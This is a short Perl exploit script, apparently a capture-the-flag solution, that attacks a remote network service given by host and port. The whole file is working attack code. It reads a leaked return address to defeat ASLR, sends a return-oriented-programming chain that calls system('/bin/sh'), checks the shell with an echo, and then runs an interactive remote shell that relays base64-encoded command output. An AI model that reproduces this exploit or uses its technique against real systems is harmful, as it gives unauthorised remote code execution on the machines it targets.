#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket;
use MIME::Base64;

if (@ARGV != 2) {
	use File::Basename;
	my $name = basename($0, "");
	die "Usage: perl $name host port\n";
}

my $main_ret_file = 0x21bf7;
my $ret_file = 0x21cf7;
my $poprdi_file = 0x215bf;
my $system_file = 0x4f550;
#my $system_file = 0x80aa0; # puts (for debug)
#my $system_file = 0x64f70; # printf (for debug)
my $binsh_file = 0x1b3e1a;

for (;;) {
	my $sock = new IO::Socket::INET(PeerAddr=>$ARGV[0], PeerPort=>int($ARGV[1]), Proto=>"tcp");
	unless ($sock) { die "connection failed: $!\n"; }
	binmode($sock);

	print $sock "\n";
	print $sock "27\n";
	print $sock "256\n";

	my $main_ret_actual = 0;
	for (;;) {
		my $line = <$sock>;
		die "connection failed!\n" unless defined($line);
		if ($line =~ /is: ([0-9a-fA-F]+)/) {
			$main_ret_actual = hex($1);
			last;
		}
	}

	my $offset = $main_ret_actual - $main_ret_file;

	my $payload =
		pack("Q", $poprdi_file + $offset) .
		pack("Q", $binsh_file + $offset) .
		pack("Q", $system_file + $offset) .
		"kitaeri\n";

	$payload = (pack("Q", $ret_file + $offset) x ((0x100 - length($payload)) >> 3)) . $payload;
	print $sock $payload;

	print $sock "echo meow\n"; # check if the shell successfully launched

	for (;;) {
		my $res = <$sock>;
		unless (defined($res)) {
			print "oops...\n";
			close($sock);
			last;
		}
		chomp($res);
		if (substr($res, length($res) - 4) eq "meow") {
			print "entering interactive mode!\n";
			while (my $line = <STDIN>) {
				chomp($line);
				if ($line eq "exit") {
					print $sock "exit\n";
					last;
				} elsif ($line eq "") {
					next;
				}
				print $sock "$line 2>&1 | base64 --wrap=999999999\n";
				my $res = <$sock>;
				unless (defined($res)) { last; }
				print MIME::Base64::decode_base64($res);
			}
			close($sock);
			exit;
		}
	}
}
